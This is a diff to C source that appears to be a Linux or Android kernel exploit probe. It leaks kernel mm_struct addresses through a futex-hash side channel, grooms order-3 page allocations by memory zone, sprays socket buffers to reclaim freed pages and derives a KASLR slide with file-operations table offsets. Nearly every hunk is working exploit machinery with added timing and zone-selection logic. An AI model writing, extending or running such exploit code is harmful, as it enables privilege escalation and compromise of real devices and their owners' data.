@@ -16,6 +16,7 @@
 #include <sys/types.h>
 #include <sys/uio.h>
 #include <sys/wait.h>
+#include <time.h>
 #include <unistd.h>
 
 #define PAGE_SIZE 4096
@@ -31,9 +32,12 @@
 #define KMEM_CACHE_FREE_ID 257
 #define MM_PARTIALS 5
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
+#define SKB_DATA_HEAD_SIZE 0xe80
+#define SKB_RECLAIM_ORDER MM_ORDER
+#define SKB_RECLAIM_SIZE ORDER3_SIZE
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
-#define SKB_DATA_DELTA (-0xe80LL)
-#define SKB_PAYLOAD_OFFSET 0xe80
+#define SKB_DATA_DELTA (-SKB_DATA_HEAD_SIZE)
+#define SKB_PAYLOAD_OFFSET SKB_DATA_HEAD_SIZE
 #define FOPS_OFFSET 0x100
 #define FOPS_TABLE_SIZE 0x120
 #define SKB_USERCOPY_LOCK_OFF 0x900
@@ -59,6 +63,8 @@ struct perf_page_sample {
     int32_t pid;
     uint64_t pfn;
     uint32_t order;
+    uint32_t gfp_flags;
+    int32_t migratetype;
 };
 
 struct perf_kmem_sample {
@@ -104,6 +110,8 @@ struct perf_capture {
     uint64_t page_event_id;
 };
 
+static uint64_t probe_start_ms;
+
 static void die(const char *what)
 {
     perror(what);
@@ -114,6 +122,20 @@ static void check_int(long value, const char *what)
 {
     if (value < 0)
         die(what);
+}
+
+static uint64_t monotonic_ms(void)
+{
+    struct timespec time;
+
+    if (clock_gettime(CLOCK_MONOTONIC, &time) < 0)
+        die("clock_gettime");
+    return (uint64_t)time.tv_sec * 1000 + (uint64_t)time.tv_nsec / 1000000;
+}
+
+static uint64_t elapsed_ms(void)
+{
+    return monotonic_ms() - probe_start_ms;
 }
 
 static int calibration_perf_cpu(void)
@@ -544,6 +566,8 @@ static void perf_capture_pages(struct perf_capture *capture)
         int32_t event_pid;
         uint64_t pfn;
         uint32_t order;
+        uint32_t gfp_flags = 0;
+        int32_t migratetype = -1;
 
         perf_ring_copy((unsigned char *)&header, ring, meta->data_size, tail,
                        sizeof(header));
@@ -562,12 +586,18 @@ static void perf_capture_pages(struct perf_capture *capture)
         memcpy(&event_pid, record + 16, sizeof(event_pid));
         memcpy(&pfn, record + 20, sizeof(pfn));
         memcpy(&order, record + 28, sizeof(order));
+        if (raw_size >= 28) {
+            memcpy(&gfp_flags, record + 32, sizeof(gfp_flags));
+            memcpy(&migratetype, record + 36, sizeof(migratetype));
+        }
         if (event_id != capture->page_event_id)
             continue;
         if (capture->page_count < PERF_CAPTURE_MAX) {
             capture->pages[capture->page_count].pid = event_pid;
             capture->pages[capture->page_count].pfn = pfn;
             capture->pages[capture->page_count].order = order;
+            capture->pages[capture->page_count].gfp_flags = gfp_flags;
+            capture->pages[capture->page_count].migratetype = migratetype;
             capture->page_count++;
         } else {
             capture->page_lost++;
@@ -757,6 +787,10 @@ static void perf_capture_stop(struct perf_capture *capture)
     size_t mm_printed = 0;
     size_t free_order3_count = 0;
     size_t free_order3_printed = 0;
+    size_t alloc_order[16] = {0};
+    size_t free_order[16] = {0};
+    size_t alloc_order_other = 0;
+    size_t free_order_other = 0;
 
     if (capture->page_fd >= 0)
         ioctl(capture->page_fd, PERF_EVENT_IOC_DISABLE, 0);
@@ -775,6 +809,10 @@ static void perf_capture_stop(struct perf_capture *capture)
     if (capture->object_free_map)
         perf_capture_object_free(capture);
     for (size_t i = 0; i < capture->page_count; ++i) {
+        if (capture->pages[i].order < 16)
+            alloc_order[capture->pages[i].order]++;
+        else
+            alloc_order_other++;
         if (capture->pages[i].order == MM_ORDER)
             order3_count++;
     }
@@ -782,6 +820,10 @@ static void perf_capture_stop(struct perf_capture *capture)
            " samples=%zu order3=%zu lost=%zu\n",
            capture->page_event_id, capture->page_count, order3_count,
            capture->page_lost);
+    printf("PAGE_CALIBRATION_PERF_ALLOC_ORDER o0=%zu o1=%zu o2=%zu "
+           "o3=%zu o4=%zu o5=%zu other=%zu\n",
+           alloc_order[0], alloc_order[1], alloc_order[2], alloc_order[3],
+           alloc_order[4], alloc_order[5], alloc_order_other);
     for (size_t i = 0; i < capture->page_count; ++i) {
         uint64_t physical;
         uintptr_t alias;
@@ -792,15 +834,20 @@ static void perf_capture_stop(struct perf_capture *capture)
         alias = physical >= PHYS_OFFSET ?
             PAGE_OFFSET | (physical - PHYS_OFFSET) : 0;
         printf("PAGE_CALIBRATION_PERF_EVENT pid=%d pfn=0x%016" PRIx64
-               " order=%u base=0x%016zx\n",
+               " order=%u gfp=0x%08x mt=%d base=0x%016zx\n",
                capture->pages[i].pid, capture->pages[i].pfn,
-               capture->pages[i].order, alias);
+               capture->pages[i].order, capture->pages[i].gfp_flags,
+               capture->pages[i].migratetype, alias);
         order3_printed++;
     }
     if (order3_count > order3_printed)
         printf("PAGE_CALIBRATION_PERF_EVENT_TRUNCATED total=%zu shown=%zu\n",
                order3_count, order3_printed);
     for (size_t i = 0; i < capture->free_page_count; ++i) {
+        if (capture->free_pages[i].order < 16)
+            free_order[capture->free_pages[i].order]++;
+        else
+            free_order_other++;
         if (capture->free_pages[i].order == MM_ORDER)
             free_order3_count++;
     }
@@ -808,6 +855,10 @@ static void perf_capture_stop(struct perf_capture *capture)
         printf("PAGE_CALIBRATION_PERF_FREE samples=%zu order3=%zu lost=%zu\n",
                capture->free_page_count, free_order3_count,
                capture->free_page_lost);
+        printf("PAGE_CALIBRATION_PERF_FREE_ORDER o0=%zu o1=%zu o2=%zu "
+               "o3=%zu o4=%zu o5=%zu other=%zu\n",
+               free_order[0], free_order[1], free_order[2], free_order[3],
+               free_order[4], free_order[5], free_order_other);
         for (size_t i = 0; i < capture->free_page_count &&
              free_order3_printed < 128; ++i) {
             uint64_t physical;
@@ -930,19 +981,43 @@ static void wait_target_frees(struct perf_capture *capture, uintptr_t base,
 static int perf_candidate_alloc_match(const struct perf_capture *capture,
                                       uintptr_t base)
 {
+    uintptr_t nearest_alias = 0;
+    uint64_t nearest_pages = UINT64_MAX;
+    uint32_t nearest_gfp = 0;
+    int32_t nearest_mt = -1;
+
     for (size_t i = 0; i < capture->page_count; ++i) {
         uint64_t physical;
+        uint64_t delta_pages;
         uintptr_t alias;
 
-        if (capture->pages[i].order != MM_ORDER)
+        if (capture->pages[i].order != SKB_RECLAIM_ORDER)
             continue;
         physical = capture->pages[i].pfn << 12;
         if (physical < PHYS_OFFSET)
             continue;
         alias = PAGE_OFFSET | (physical - PHYS_OFFSET);
-        if (alias == base)
+        delta_pages = alias > base ? (alias - base) / PAGE_SIZE :
+                                     (base - alias) / PAGE_SIZE;
+        if (delta_pages < nearest_pages) {
+            nearest_alias = alias;
+            nearest_pages = delta_pages;
+            nearest_gfp = capture->pages[i].gfp_flags;
+            nearest_mt = capture->pages[i].migratetype;
+        }
+        if (alias == base) {
+            printf("PAGE_CALIBRATION_ALLOC_CANDIDATE_EVENT pfn=0x%016" PRIx64
+                   " order=%u gfp=0x%08x mt=%d base=0x%016zx\n",
+                   capture->pages[i].pfn, capture->pages[i].order,
+                   capture->pages[i].gfp_flags,
+                   capture->pages[i].migratetype, alias);
             return 1;
+        }
     }
+    if (nearest_alias)
+        printf("PAGE_CALIBRATION_ALLOC_NEAREST candidate=0x%016zx base=0x%016zx delta_pages=%" PRIu64 " order=%u gfp=0x%08x mt=%d\n",
+               base, nearest_alias, nearest_pages, SKB_RECLAIM_ORDER,
+               nearest_gfp, nearest_mt);
     return 0;
 }
 
@@ -1071,11 +1146,12 @@ static int perf_candidate_match(const struct perf_capture *capture,
     }
     page_base = perf_candidate_alloc_match(capture, base);
     page_free_base = perf_candidate_page_free_match(capture, base);
-    printf("PAGE_CALIBRATION_COMPARE candidate=0x%016zx kmem_exact=%d kmem_base=%d kmem_page_allocs=%zu kmem_page_unique=%zu kmem_page_bitmap=0x%016" PRIx64 " object_free_exact=%d object_free_base=%d object_free_page_frees=%zu object_free_page_unique=%zu object_free_page_slots=%zu object_free_page_bitmap=0x%016" PRIx64 " page_order3_base=%d page_free_base=%d accepted=%d\n",
+    printf("PAGE_CALIBRATION_COMPARE candidate=0x%016zx kmem_exact=%d kmem_base=%d kmem_page_allocs=%zu kmem_page_unique=%zu kmem_page_bitmap=0x%016" PRIx64 " object_free_exact=%d object_free_base=%d object_free_page_frees=%zu object_free_page_unique=%zu object_free_page_slots=%zu object_free_page_bitmap=0x%016" PRIx64 " page_alloc_base=%d page_alloc_order=%d page_free_base=%d accepted=%d\n",
            base, kmem_exact, kmem_base, kmem_page_allocs, kmem_page_unique,
            kmem_page_bitmap, object_free_exact, object_free_base,
            object_free_page_frees, object_free_page_unique,
            object_free_page_slots, object_free_page_bitmap, page_base,
+           SKB_RECLAIM_ORDER,
            page_free_base,
            kmem_exact || kmem_base ||
            object_free_exact || object_free_base || page_base || page_free_base);
@@ -1386,6 +1462,36 @@ static void send_blob(int fd, unsigned char *blob)
 
     if (sent != SKB_SEND_SIZE)
         die("sendmsg");
+}
+
+static unsigned long send_blob_spray(int fd, unsigned char *blob,
+                                     unsigned long requested)
+{
+    unsigned long full = 0;
+    ssize_t last_ret = 0;
+    int last_errno = 0;
+
+    if (!requested)
+        requested = 1;
+    for (unsigned long i = 0; i < requested; ++i) {
+        int flags = i ? MSG_DONTWAIT : 0;
+
+        errno = 0;
+        last_ret = send_blob_flags(fd, blob, flags);
+        last_errno = errno;
+        if (last_ret != SKB_SEND_SIZE) {
+            printf("PAGE_LEAK_SKB_SEND_STOP index=%lu/%lu ret=%zd errno=%d t_ms=%" PRIu64 "\n",
+                   i + 1, requested, last_ret, last_errno, elapsed_ms());
+            break;
+        }
+        full++;
+        if (getenv("PAGE_LEAK_VERBOSE"))
+            printf("PAGE_LEAK_SKB_SEND index=%lu/%lu ret=%zd t_ms=%" PRIu64 "\n",
+                   i + 1, requested, last_ret, elapsed_ms());
+    }
+    printf("PAGE_LEAK_SKB_SENT requested=%lu full=%lu last_ret=%zd last_errno=%d t_ms=%" PRIu64 "\n",
+           requested, full, last_ret, last_errno, elapsed_ms());
+    return full;
 }
 
 static unsigned long env_ulong(const char *name, unsigned long fallback)
@@ -1713,54 +1819,145 @@ static int flush_target_rotate(struct perf_capture *perf, uintptr_t base,
     return 1;
 }
 
-static int leak_one_controlled_mm(size_t cpu_count, uintptr_t *mm_out)
+static uintptr_t match_controlled_mm_page(
+    const struct kernelsnitch_shared_state *ks, uintptr_t base,
+    size_t *match_count_out)
 {
-    struct kernelsnitch_shared_state *one;
-    pid_t child;
-    int fd;
-    int status;
+    uintptr_t end = base + ORDER3_SIZE;
+    uintptr_t found = (uintptr_t)-1;
+    size_t match_count = 0;
 
-    one = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, 4,
-                             getenv("PAGE_LEAK_VERBOSE") ? 1 : 0, 0);
-    if (!one)
-        return -1;
-    child = spawn_collision(one);
-    fd = open_mem(child);
-    if (waitpid(child, &status, 0) < 0) {
-        close(fd);
-        one->state = KERNELSNITCH_MM_NOT_FOUND;
-        kernelsnitch_cleanup(one);
-        return -1;
+    if (ks->mte_enabled) {
+        if (match_count_out)
+            *match_count_out = 0;
+        return (uintptr_t)-1;
     }
-    if (!WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
-        !kernelsnitch_found_collisions(one)) {
-        close(fd);
-        one->state = KERNELSNITCH_MM_NOT_FOUND;
-        kernelsnitch_cleanup(one);
-        return -2;
+    for (uintptr_t candidate = base; candidate < end;
+         candidate += MM_STRUCT_SZ) {
+        size_t hash = futex_hash(ks->futex_addrs[0], candidate);
+        size_t matches = 1;
+
+        for (size_t i = 1; i < ks->collisions; ++i)
+            matches += hash == futex_hash(ks->futex_addrs[i], candidate);
+        if (matches == ks->collisions) {
+            found = candidate;
+            match_count++;
+        }
     }
-    kernelsnitch_bruteforce(one);
-    if (one->mm_struct == (uintptr_t)-1) {
-        close(fd);
+    if (match_count_out)
+        *match_count_out = match_count;
+    return match_count == 1 ? found : (uintptr_t)-1;
+}
+
+static int leak_one_controlled_mm(size_t cpu_count, uintptr_t hint_base,
+                                  uintptr_t *mm_out, int *hint_hit_out)
+{
+    uintptr_t current_hint = hint_base;
+    size_t collision_count = hint_base ? 2 : 4;
+    size_t pass_count = hint_base ? 2 : 1;
+
+    if (hint_hit_out)
+        *hint_hit_out = 0;
+
+    for (size_t pass = 0; pass < pass_count; ++pass) {
+        struct kernelsnitch_shared_state *one = kernelsnitch_setup(
+            MM_STRUCT_SZ, MM_ORDER, cpu_count, collision_count,
+            getenv("PAGE_LEAK_VERBOSE") ? 1 : 0, 0);
+        pid_t child;
+        int fd;
+        int status;
+
+        if (!one)
+            return -1;
+        child = spawn_collision(one);
+        fd = open_mem(child);
+        if (waitpid(child, &status, 0) < 0) {
+            close(fd);
+            one->state = KERNELSNITCH_MM_NOT_FOUND;
+            kernelsnitch_cleanup(one);
+            return -1;
+        }
+        if (!WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
+            !kernelsnitch_found_collisions(one)) {
+            close(fd);
+            one->state = KERNELSNITCH_MM_NOT_FOUND;
+            kernelsnitch_cleanup(one);
+            if (current_hint) {
+                current_hint = 0;
+                collision_count = 4;
+                continue;
+            }
+            return -2;
+        }
+        if (current_hint) {
+            size_t match_count = 0;
+
+            one->mm_struct = match_controlled_mm_page(
+                one, current_hint, &match_count);
+            if (one->mm_struct != (uintptr_t)-1) {
+                one->found = 1;
+                one->state = KERNELSNITCH_MM_FOUND;
+                if (hint_hit_out)
+                    *hint_hit_out = 1;
+            } else {
+                printf("PAGE_LEAK_NO_PERF_HINT_RETRY base=0x%016zx matches=%zu collisions=%zu t_ms=%" PRIu64 "\n",
+                       current_hint, match_count, one->collisions,
+                       elapsed_ms());
+                close(fd);
+                one->state = KERNELSNITCH_MM_NOT_FOUND;
+                kernelsnitch_cleanup(one);
+                current_hint = 0;
+                collision_count = 4;
+                continue;
+            }
+        } else {
+            kernelsnitch_bruteforce(one);
+        }
+        if (one->mm_struct == (uintptr_t)-1) {
+            close(fd);
+            kernelsnitch_cleanup(one);
+            return -2;
+        }
+        *mm_out = one->mm_struct;
         kernelsnitch_cleanup(one);
-        return -2;
+        return fd;
     }
-    *mm_out = one->mm_struct;
-    kernelsnitch_cleanup(one);
-    return fd;
+    return -2;
+}
+
+enum controlled_mm_zone {
+    CONTROLLED_MM_INVALID,
+    CONTROLLED_MM_DMA32,
+    CONTROLLED_MM_NORMAL,
+};
+
+static enum controlled_mm_zone controlled_mm_zone(uintptr_t mm)
+{
+    uintptr_t base = mm & ~(ORDER3_SIZE - 1);
+
+    if (base >= MM_DMA32_ALIAS_START && base < MM_DMA32_ALIAS_END)
+        return CONTROLLED_MM_DMA32;
+    if (base >= MM_NORMAL_ALIAS_START && base < MM_NORMAL_ALIAS_END)
+        return CONTROLLED_MM_NORMAL;
+    return CONTROLLED_MM_INVALID;
+}
+
+static const char *controlled_mm_zone_name(enum controlled_mm_zone zone)
+{
+    if (zone == CONTROLLED_MM_DMA32)
+        return "dma32";
+    if (zone == CONTROLLED_MM_NORMAL)
+        return "normal";
+    return "invalid";
 }
 
 static int valid_controlled_mm(uintptr_t mm)
 {
     uintptr_t base = mm & ~(ORDER3_SIZE - 1);
     uintptr_t offset = mm - base;
-    int in_low = base >= UINT64_C(0xffffff8000000000) &&
-        base < UINT64_C(0xffffff8080000000);
-    int in_high = base >= UINT64_C(0xffffff8800000000) &&
-        base < UINT64_C(0xffffff8a00000000);
 
-    return (in_low || in_high) && offset < ORDER3_SIZE &&
-        offset % MM_STRUCT_SZ == 0;
+    return controlled_mm_zone(mm) != CONTROLLED_MM_INVALID &&
+        offset < ORDER3_SIZE && offset % MM_STRUCT_SZ == 0;
 }
 
 static int flush_target_rotate_no_perf(uintptr_t base, size_t batch,
@@ -1778,7 +1975,7 @@ static int flush_target_rotate_no_perf(uintptr_t base, size_t batch,
         uintptr_t mm = 0;
         uintptr_t candidate_base;
         size_t slot;
-        int fd = leak_one_controlled_mm(cpu_count, &mm);
+        int fd = leak_one_controlled_mm(cpu_count, base, &mm, NULL);
 
         if (fd == -2)
             continue;
@@ -1841,33 +2038,67 @@ static int collect_no_perf_full_group(size_t batch, unsigned long max_refs,
                                       int *chosen_fds)
 {
     const size_t max_groups = 64;
+    int fast_skip_dma32 =
+        getenv("PAGE_LEAK_NO_PERF_FAST_SKIP_DMA32") != NULL;
+    unsigned long dma32_skip_slabs = fast_skip_dma32 ?
+        env_ulong("PAGE_LEAK_NO_PERF_DMA32_SKIP_SLABS", 8) : 0;
     uintptr_t *group_bases = calloc(max_groups, sizeof(*group_bases));
     size_t *group_counts = calloc(max_groups, sizeof(*group_counts));
     int *group_fds = calloc(max_groups * batch, sizeof(*group_fds));
     unsigned char *group_seen = calloc(max_groups * batch,
                                        sizeof(*group_seen));
+    size_t opaque_capacity = 0;
+    int *opaque_fds;
+    size_t opaque_count = 0;
     size_t group_count = 0;
+    size_t chosen_group = max_groups;
+    size_t hint_hits = 0;
+    size_t hint_misses = 0;
+    uintptr_t hint_base = 0;
+    unsigned long chosen_attempt = 0;
     int result = 0;
 
-    if (!group_bases || !group_counts || !group_fds || !group_seen)
+    if (fast_skip_dma32) {
+        if (fast_skip_dma32 &&
+            (!dma32_skip_slabs || dma32_skip_slabs > SIZE_MAX / batch))
+            die("no-perf dma32 skip slabs");
+        if (max_refs > SIZE_MAX / batch)
+            die("no-perf opaque skip size");
+        opaque_capacity = (size_t)max_refs * batch;
+    }
+    opaque_fds = opaque_capacity ?
+        malloc(opaque_capacity * sizeof(*opaque_fds)) : NULL;
+    if (!group_bases || !group_counts || !group_fds || !group_seen ||
+        (opaque_capacity && !opaque_fds))
         die("calloc no-perf groups");
     if (chosen_fds)
         for (size_t i = 0; i < batch; ++i)
             chosen_fds[i] = -1;
     for (size_t i = 0; i < max_groups * batch; ++i)
         group_fds[i] = -1;
+    printf("PAGE_LEAK_NO_PERF_GROUP_SEARCH max_scans=%lu target_zone=normal fast_skip_dma32=%d dma32_skip_slabs=%lu opaque_ref_limit=%zu t_ms=%" PRIu64 "\n",
+           max_refs, fast_skip_dma32, dma32_skip_slabs, opaque_capacity,
+           elapsed_ms());
     for (unsigned long attempt = 1;
          attempt <= max_refs && !result; ++attempt) {
         uintptr_t mm = 0;
         uintptr_t base;
         size_t slot;
         size_t group = max_groups;
-        int fd = leak_one_controlled_mm(cpu_count, &mm);
+        int hint_hit = 0;
+        int fd = leak_one_controlled_mm(cpu_count, hint_base, &mm,
+                                        &hint_hit);
 
         if (fd == -2)
             continue;
         if (fd < 0)
             break;
+        if (hint_base) {
+            if (hint_hit)
+                hint_hits++;
+            else
+                hint_misses++;
+        }
         if (!valid_controlled_mm(mm)) {
             check_int(close(fd), "close invalid no-perf group");
             continue;
@@ -1878,6 +2109,31 @@ static int collect_no_perf_full_group(size_t batch, unsigned long max_refs,
             check_int(close(fd), "close no-perf group bad slot");
             continue;
         }
+        if (fast_skip_dma32 &&
+            controlled_mm_zone(base) == CONTROLLED_MM_DMA32) {
+            size_t skip_refs = (size_t)dma32_skip_slabs * batch;
+            size_t remaining = opaque_capacity - opaque_count;
+
+            if (remaining < batch) {
+                check_int(close(fd), "close dma32 limit candidate");
+                printf("PAGE_LEAK_NO_PERF_DMA32_LIMIT attempt=%lu base=0x%016zx total_held=%zu limit=%zu t_ms=%" PRIu64 "\n",
+                       attempt, base, opaque_count, opaque_capacity,
+                       elapsed_ms());
+                break;
+            }
+            if (skip_refs > remaining)
+                skip_refs = remaining - remaining % batch;
+            opaque_fds[opaque_count++] = fd;
+            pin_to_core(0);
+            for (size_t i = 1; i < skip_refs; ++i)
+                opaque_fds[opaque_count++] = clone_memfd();
+            printf("PAGE_LEAK_NO_PERF_DMA32_SKIP attempt=%lu base=0x%016zx slot=%zu slabs=%zu held=%zu total_held=%zu t_ms=%" PRIu64 "\n",
+                   attempt, base, slot, skip_refs / batch, skip_refs,
+                   opaque_count, elapsed_ms());
+            hint_base = 0;
+            continue;
+        }
+        hint_base = base;
         for (size_t i = 0; i < group_count; ++i) {
             if (group_bases[i] == base) {
                 group = i;
@@ -1895,23 +2151,34 @@ static int collect_no_perf_full_group(size_t batch, unsigned long max_refs,
         group_seen[group * batch + slot] = 1;
         group_fds[group * batch + slot] = fd;
         group_counts[group]++;
-        printf("PAGE_LEAK_NO_PERF_GROUP attempt=%lu group=%zu base=0x%016zx slot=%zu count=%zu\n",
-               attempt, group, base, slot, group_counts[group]);
+        if (getenv("PAGE_LEAK_VERBOSE") || group_counts[group] == 1 ||
+            group_counts[group] % 8 == 0 || group_counts[group] + 1 >= batch)
+            printf("PAGE_LEAK_NO_PERF_GROUP attempt=%lu group=%zu base=0x%016zx zone=%s slot=%zu count=%zu t_ms=%" PRIu64 "\n",
+                   attempt, group, base,
+                   controlled_mm_zone_name(controlled_mm_zone(base)), slot,
+                   group_counts[group], elapsed_ms());
         if (group_counts[group] == batch) {
+            if (controlled_mm_zone(base) != CONTROLLED_MM_NORMAL) {
+                printf("PAGE_LEAK_NO_PERF_GROUP_REJECT group=%zu base=0x%016zx zone=%s reason=skb-zone-mismatch held=%zu t_ms=%" PRIu64 "\n",
+                       group, base,
+                       controlled_mm_zone_name(controlled_mm_zone(base)),
+                       group_counts[group], elapsed_ms());
+                continue;
+            }
+            chosen_group = group;
+            chosen_attempt = attempt;
             *base_out = base;
             result = 1;
         }
     }
+    pin_to_core(0);
     if (result) {
-        size_t chosen = 0;
-        while (chosen < group_count && group_counts[chosen] != batch)
-            chosen++;
         for (size_t group = 0; group < group_count; ++group) {
             for (size_t slot = 0; slot < batch; ++slot) {
                 int fd = group_fds[group * batch + slot];
                 if (fd < 0)
                     continue;
-                if (group == chosen && chosen_fds) {
+                if (group == chosen_group && chosen_fds) {
                     chosen_fds[slot] = fd;
                     group_fds[group * batch + slot] = -1;
                     continue;
@@ -1920,17 +2187,24 @@ static int collect_no_perf_full_group(size_t batch, unsigned long max_refs,
                 group_fds[group * batch + slot] = -1;
             }
         }
-        printf("PAGE_LEAK_NO_PERF_GROUP_FULL group=%zu base=0x%016zx\n",
-               chosen, *base_out);
+        printf("PAGE_LEAK_NO_PERF_GROUP_FULL group=%zu base=0x%016zx zone=%s attempts=%lu groups=%zu t_ms=%" PRIu64 "\n",
+               chosen_group, *base_out,
+               controlled_mm_zone_name(controlled_mm_zone(*base_out)),
+               chosen_attempt, group_count, elapsed_ms());
     } else {
-        printf("PAGE_LEAK_NO_PERF_GROUP_FAIL groups=%zu max=%lu\n",
-               group_count, max_refs);
+        printf("PAGE_LEAK_NO_PERF_GROUP_FAIL groups=%zu max=%lu target_zone=normal t_ms=%" PRIu64 "\n",
+               group_count, max_refs, elapsed_ms());
         for (size_t group = 0; group < group_count; ++group)
             for (size_t slot = 0; slot < batch; ++slot)
                 if (group_fds[group * batch + slot] >= 0)
                     check_int(close(group_fds[group * batch + slot]),
                               "close incomplete no-perf group");
     }
+    for (size_t i = 0; i < opaque_count; ++i)
+        check_int(close(opaque_fds[i]), "close no-perf dma32 skip");
+    printf("PAGE_LEAK_NO_PERF_GROUP_HINT hits=%zu misses=%zu t_ms=%" PRIu64
+           "\n", hint_hits, hint_misses, elapsed_ms());
+    free(opaque_fds);
     free(group_seen);
     free(group_fds);
     free(group_counts);
@@ -1938,8 +2212,7 @@ static int collect_no_perf_full_group(size_t batch, unsigned long max_refs,
     return result;
 }
 
-static int drain_no_perf_group(int *target_fds, size_t batch,
-                               uintptr_t target_base)
+static int drain_no_perf_group(int *target_fds, size_t batch)
 {
     unsigned long trigger_pages = env_ulong(
         "PAGE_LEAK_NO_PERF_TRIGGER_PAGES", 14);
@@ -1953,7 +2226,6 @@ static int drain_no_perf_group(int *target_fds, size_t batch,
     trigger_fds = calloc(trigger_refs, sizeof(*trigger_fds));
     if (!trigger_fds)
         die("calloc no-perf triggers");
-    (void)target_base;
     for (size_t i = 0; i < trigger_refs; ++i)
         trigger_fds[i] = clone_memfd();
     s2 = clone_memfd();
@@ -2116,22 +2388,26 @@ int a536_probe_main(void)
     int skb_reclaim = getenv("PAGE_LEAK_SKB_RECLAIM") != NULL;
     int perf_defer_stop = getenv("PAGE_LEAK_PERF_DEFER_STOP") != NULL;
     int brute_before_skb = getenv("PAGE_LEAK_BRUTE_BEFORE_SKB") != NULL;
+    int group_free_confirmed = 1;
     int defer_bruteforce =
         getenv("PAGE_LEAK_BRUTE_AFTER_RECLAIM") != NULL ||
         brute_before_skb;
     int perf_ready = 0;
     struct perf_capture perf;
 
+    probe_start_ms = monotonic_ms();
     set_unbuffer();
     set_limit();
     set_proc_name("rmg-page-leak");
     if (getenv("PAGE_LEAK_CPU"))
         pin_to_core(0);
     printf("PAGE_LEAK_START calibrate=%d no_perf=%d validate_only=%d dual=%d "
-           "keep_prep=%d defer_spray=%d pin_children=%d pid=%d\n",
+           "keep_prep=%d defer_spray=%d pin_children=%d "
+           "pid=%d t_ms=%" PRIu64 "\n",
            calibrate, no_perf, validate_only, dual, keep_prep_children,
-           defer_spray_close, getenv("PAGE_LEAK_PIN_CHILDREN") != NULL,
-           getpid());
+           defer_spray_close,
+           getenv("PAGE_LEAK_PIN_CHILDREN") != NULL,
+           getpid(), elapsed_ms());
     if (calibrate && (!no_perf || group_calibrate) &&
         !getenv("PAGE_LEAK_PERF_LATE")) {
         perf_ready = getenv("PAGE_LEAK_PERF_KMEM_ONLY") ?
@@ -2143,8 +2419,9 @@ int a536_probe_main(void)
     ctx_init(&spray, (1 + MM_PARTIALS) * objs_per_slab);
     ctx_init(&pre, objs_per_slab - 1);
     ctx_init(&post, objs_per_slab);
-    printf("PAGE_LEAK_BEGIN objs=%zu contexts=%zu/%zu/%zu/%zu\n",
-           objs_per_slab, prep.count, spray.count, pre.count, post.count);
+    printf("PAGE_LEAK_BEGIN objs=%zu contexts=%zu/%zu/%zu/%zu t_ms=%" PRIu64 "\n",
+           objs_per_slab, prep.count, spray.count, pre.count, post.count,
+           elapsed_ms());
 
     for (size_t i = 0; i < prep.count; ++i) {
         if (keep_prep_children) {
@@ -2358,6 +2635,9 @@ int a536_probe_main(void)
                 printf("PAGE_LEAK_SKB_FOPS_READY slide=%#llx\n",
                        (unsigned long long)slide);
             }
+            printf("PAGE_LEAK_SKB_GEOMETRY send_size=%u head=%u frag_order=%u frag_size=%u t_ms=%" PRIu64 "\n",
+                   SKB_SEND_SIZE, SKB_DATA_HEAD_SIZE, SKB_RECLAIM_ORDER,
+                   SKB_RECLAIM_SIZE, elapsed_ms());
             check_int(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_sv),
                       "socketpair reclaim pcp");
             check_int(socketpair(AF_UNIX, SOCK_STREAM, 0, skb_sv),
@@ -2503,14 +2783,17 @@ int a536_probe_main(void)
                 }
                 base = leaked & ~(ORDER3_SIZE - 1);
                 payload = (uintptr_t)base;
-                printf("PAGE_LEAK_CANDIDATE_BEFORE_SKB mm=0x%016zx base=0x%016zx payload=0x%016zx\n",
-                       leaked, base, payload);
+                printf("PAGE_LEAK_INITIAL_KS_CANDIDATE mm=0x%016zx base=0x%016zx zone=%s payload=0x%016zx t_ms=%" PRIu64 "\n",
+                       leaked, base,
+                       controlled_mm_zone_name(controlled_mm_zone(base)),
+                       payload, elapsed_ms());
                 print_ks_details(ks, leaked);
                 pin_to_core(0);
                 close_ctx(&prep);
                 close_ctx(&spray);
-                printf("PAGE_LEAK_FREE_ALL_BEFORE_SKB prep=%zu spray=%zu\n",
-                       prep_left, spray_left);
+                printf("PAGE_LEAK_FREE_ALL_BEFORE_SKB prep=%zu spray=%zu "
+                       "t_ms=%" PRIu64 "\n",
+                       prep_left, spray_left, elapsed_ms());
                 if (getenv("PAGE_LEAK_FLUSH_TARGET_ALLOC") && perf_ready) {
                     perf_capture_stop(&perf);
                     perf_ready = perf_capture_start_kmem(&perf);
@@ -2534,9 +2817,8 @@ int a536_probe_main(void)
                         if (getenv("PAGE_LEAK_NO_PERF_GROUP_TARGET") &&
                             (no_perf || group_calibrate)) {
                             if (getenv("PAGE_LEAK_NO_PERF_FAST_KS")) {
-                                setenv("KSNITCH_COLLISIONS", "4", 1);
                                 setenv("KSNITCH_APPENDED", "256", 1);
-                                printf("PAGE_LEAK_NO_PERF_FAST_KS collisions=4 appended=256\n");
+                                printf("PAGE_LEAK_NO_PERF_FAST_KS first_collisions=4 hint_collisions=2 appended=256\n");
                             }
                             unsigned long max_refs = env_ulong(
                                 "PAGE_LEAK_NO_PERF_GROUP_MAX", 128);
@@ -2548,16 +2830,22 @@ int a536_probe_main(void)
                             int ok = collect_no_perf_full_group(
                                 objs_per_slab, max_refs,
                                 (size_t)cpu_count, &group_base, group_fds);
-                            printf("PAGE_LEAK_NO_PERF_GROUP_TARGET ok=%d max=%lu base=0x%016zx\n",
-                                   ok, max_refs, group_base);
+                            printf("PAGE_LEAK_NO_PERF_GROUP_TARGET ok=%d max=%lu base=0x%016zx zone=%s t_ms=%" PRIu64 "\n",
+                                   ok, max_refs, group_base,
+                                   controlled_mm_zone_name(
+                                       controlled_mm_zone(group_base)),
+                                   elapsed_ms());
                             if (!ok) {
                                 free(group_fds);
                                 return 4;
                             }
                             base = group_base;
                             payload = (uintptr_t)base;
-                            printf("PAGE_LEAK_NO_PERF_GROUP_SELECTED base=0x%016zx payload=0x%016zx\n",
-                                   base, payload);
+                            printf("PAGE_LEAK_NO_PERF_GROUP_SELECTED base=0x%016zx zone=%s payload=0x%016zx t_ms=%" PRIu64 "\n",
+                                   base,
+                                   controlled_mm_zone_name(
+                                       controlled_mm_zone(base)),
+                                   payload, elapsed_ms());
                             if (getenv("PAGE_LEAK_NO_PERF_TARGET_DRY")) {
                                 for (size_t i = 0; i < objs_per_slab; ++i)
